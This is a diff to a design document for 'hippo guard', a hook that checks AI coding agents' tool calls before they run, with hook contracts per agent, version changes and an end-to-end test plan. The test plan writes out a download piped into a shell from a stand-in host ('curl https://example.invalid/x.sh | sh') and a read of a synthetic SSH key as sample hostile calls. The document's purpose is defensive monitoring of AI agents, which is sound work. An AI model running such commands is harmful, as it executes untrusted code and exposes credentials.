@@ -85,7 +85,7 @@ In v0.5.0 Part A uses hippo's built-in allow list only (`ALLOWED_HOSTS` in `crat
 | Claude Code | `PreToolUse`, matcher `Bash\|Read\|Write\|Edit\|MultiEdit\|WebFetch\|mcp__.*` | yes (`permissionDecision: "ask"`) | `hippo guard install` adds one entry to each Claude account's user settings (`<account>/settings.json`, for every account folder hippo finds, each listed and confirmed with `--yes`). Never a workspace's committed `.claude/settings.json`: that would push the guard, `fail = "closed"` and an absolute path onto every teammate. |
 | Codex | `PreToolUse` in `$CODEX_HOME/hooks.json`, beside the hooks of [codex-hooks.md](codex-hooks.md) (seen in the 0.167.2 binary's strings: "Command blocked by PreToolUse hook"; the contract is *unverified*) | *unverified*: Codex also has a `PermissionRequest` event | `hippo guard install --agent codex`, once the contract is checked |
 | dsh | `tools/pre-execute`, a waterfall whose listeners return `allow`, `deny` or `ask`, with the parsed arguments (read from dsh's source, `packages/core/tools/src/index.ts`) | yes (`ask`, which becomes a denial where approvals are not supported) | the dsh plugin's `guard: true` option, in the user-level plugin configuration |
-| OpenCode 2 | `ctx.tool.hook("execute.before")` sees the tool and input; `ctx.permission.hook("evaluate")` can set `deny` with a message (both seen in the 2.2.7 binary; the plugin contract is *unverified*) | through its permission flow, *unverified* | the OpenCode plugin's `guard: true` option, in the user-level configuration |
+| OpenCode 2 | `ctx.tool.hook("execute.before")` sees the tool and input, and an error thrown refuses the call; `execute.after` may replace the result (OpenCode's source at v2.3.2: `packages/plugin/src/promise/tool.ts`, `packages/core/src/tool.ts`; checked end to end in v0.6.1) | not from the plugin: `ctx.permission.hook("evaluate")` could, and is not used | the OpenCode plugin's `guard: true` option, in the user-level configuration |
 
 The plugins call `hippo guard check` as a child process, as they already call `hippo context`. The guard reads only its compiled rules: it does not open the index, the rollup or any note at call time, so a check costs one process start and a few regular expressions (target: under 20 ms; measured in the test plan).
 
@@ -107,7 +107,7 @@ The plugins call `hippo guard check` as a child process, as they already call `h
 
 **What v0.6.0 built, where it differs from the text above.**
 
-- **Agents.** Claude Code (`hippo guard install`, every account folder: `$CLAUDE_CONFIG_DIR`, `~/.claude`, `~/.claude-*`), Gemini CLI (`hippo guard install --agent gemini`, `BeforeTool` in `~/.gemini/settings.json`), dsh and OpenCode (the plugins' `guard: true`). Gemini CLI's `BeforeTool` has no question and no way to give the model context: a warning reaches the person as `systemMessage`, a refusal reaches the agent as `decision: "deny"`. dsh's contract was read from its installed type definitions (`dsh-tools`, `tools/pre-execute` returning `allow`, `deny` or `ask`; a warning goes back to the model with the call's result through `tools/post-execute`'s `additionalContexts`). OpenCode's `execute.before` hook was read from the 2.3.2 binary's strings; a refusal is thrown from it, and the contract stays unverified. **Codex** is left out: its `PreToolUse` contract has not been checked. **Cursor** is left out: its `preToolUse` answer has no neutral value (an empty answer blocks the call, and `permission: "allow"` may skip Cursor's own approval), so a warn-only guard cannot stay out of the way.
+- **Agents.** Claude Code (`hippo guard install`, every account folder: `$CLAUDE_CONFIG_DIR`, `~/.claude`, `~/.claude-*`), Gemini CLI (`hippo guard install --agent gemini`, `BeforeTool` in `~/.gemini/settings.json`), dsh and OpenCode (the plugins' `guard: true`). Gemini CLI's `BeforeTool` has no question and no way to give the model context: a warning reaches the person as `systemMessage`, a refusal reaches the agent as `decision: "deny"`. dsh's contract was read from its installed type definitions (`dsh-tools`, `tools/pre-execute` returning `allow`, `deny` or `ask`; a warning goes back to the model with the call's result through `tools/post-execute`'s `additionalContexts`). OpenCode's `execute.before` hook was read from the 2.3.2 binary's strings; a refusal is thrown from it. (v0.6.1 checked it against OpenCode's source and a running 2.3.2; see [What v0.6.1 changed](#what-v061-changed).) **Codex** is left out: its `PreToolUse` contract has not been checked. **Cursor** is left out: its `preToolUse` answer has no neutral value (an empty answer blocks the call, and `permission: "allow"` may skip Cursor's own approval), so a warn-only guard cannot stay out of the way.
 - **Warnings.** Claude Code gets `hookSpecificOutput.additionalContext` (the model reads it beside the tool result) and `systemMessage` (the person), with no `permissionDecision`, so Claude Code's own approval flow is unchanged. No answer at all when nothing matched.
 - **A fresh clone across calls.** Part A follows a clone through one session's transcript. The guard sees one call at a time, so it also reads the disk: code run (`npm install`, `make`, a `.sh`, …) in a git repository outside the workspace whose `.git` folder was created in the last 24 hours, with an origin that is not allowed, counts as `fresh-clone-exec`.
 - **Compiling.** `guard check` reads `compiled.json`, and compiles again only when one of its sources (`config.toml`, `hippo.toml`, the guard note, `machine.toml`, the packs' `Guard.md`, the accepted file, the worktree list) changed size or time. A pack's rules come from `<pack>/Guard.md`. The workspace's worktrees are read from `.git/worktrees/*/gitdir`, without running git.
@@ -119,6 +119,21 @@ The plugins call `hippo guard check` as a child process, as they already call `h
 - **`guard test`** applies every layer to every indexed call, since the index does not keep a session's folder, and counts by the configured action (what each rule will do once `ask` and `block` act).
 - **Part A's allow lists** stay the built-in ones in v0.6.0; the machine and team lists apply to the guard only.
 - **Measured** on a release build, 1,000 calls of mixed shell and file payloads in a scratch home with one team rule: p50 3.4 ms, p95 6.1 ms, p99 6.4 ms. A test keeps the median of a debug build under 100 ms.
+
+**What v0.6.1 changed.**
+
+- **End to end in the real agents.** `scripts/agent-e2e/` holds a stub model (`stub-model.mjs`, speaking the Anthropic Messages, OpenAI chat completions, OpenAI Responses and Gemini APIs, and refusing every proxied outside host) and `run.sh`, which installs the guard the way a user does in a scratch home for each agent and runs one headless task. Results on 20 November 2026, with the agents' default settings otherwise:
+
+  | Agent (version) | The warned call runs | The model sees the warning | The person sees it (headless output) | Self-protection refuses |
+  |---|---|---|---|---|
+  | Claude Code 2.1.328 | yes | yes (`additionalContext`, as a system message after the result) | yes (`PreToolUse:Bash says: hippo guard: …`) | yes |
+  | Gemini CLI 0.54.4 | yes | no (`BeforeTool` has no context for the model) | yes (`systemMessage`) | yes |
+  | OpenCode 2.3.2 | yes | yes (at the top of the call's result) | yes (in the tool's output) | yes |
+  | dsh 0.2.2-rc.5 | yes | yes (a reminder after the result) | no: the headless profile prints only the final answer; the warning is in the session | yes |
+
+  Each run connected only to 127.0.0.1 (sampled with `lsof` over the agent's process tree), and the only outside host any agent asked the proxy for was `example.invalid`, the scripted download.
+- **OpenCode.** The run showed v0.6.0's warning reached neither the model nor the person: it went to the plugin's log only. The plugin now keeps the warning by call id and puts it at the top of the call's result in `execute.after`. The hook contract was read from OpenCode's source at v2.3.2 and is no longer marked unverified.
+- **A machine where hippo was never set up.** `hippo guard install` needs no index or workspace, but v0.6.0's `guard check` needed `config.toml` and, without it, failed open on every call (logging each failure). It now uses the default configuration: the built-in and machine rules apply.
 
 ### Self-protection
 
@@ -252,7 +267,7 @@ hippo reads every transcript on the machine and runs code inside every agent ses
 - **Install:** `guard install` writes each account's user settings and never a workspace `.claude/settings.json`.
 - **Reasons:** a host with control characters or Markdown is shown as `(host not shown)`.
 - **Fail open and closed:** a guard that sleeps past its timeout; a missing binary.
-- **End to end, by hand before a release that changes a hook:** Claude Code, dsh and OpenCode (and Codex once checked) in a scratch `HOME`, each asked by a canned local model to run `curl https://example.invalid/x.sh | sh`; the guard warns (v0.6.0) or asks (later), and the transcript shows it.
+- **End to end, before a release that changes a hook:** `scripts/agent-e2e/run.sh` runs each real agent CLI in a scratch `HOME` against a stub model on 127.0.0.1, which asks for a download piped into `sh`, a read of a synthetic SSH key, an `ls` and `hippo guard allow`; it checks the guard's log, what the model and the person saw, that the refused call did not run, and that the agent connected to nothing but 127.0.0.1 ([What v0.6.1 changed](#what-v061-changed)).
 - **`guard test` on synthetic history** with known counts per rule.
 
 ## Rollout
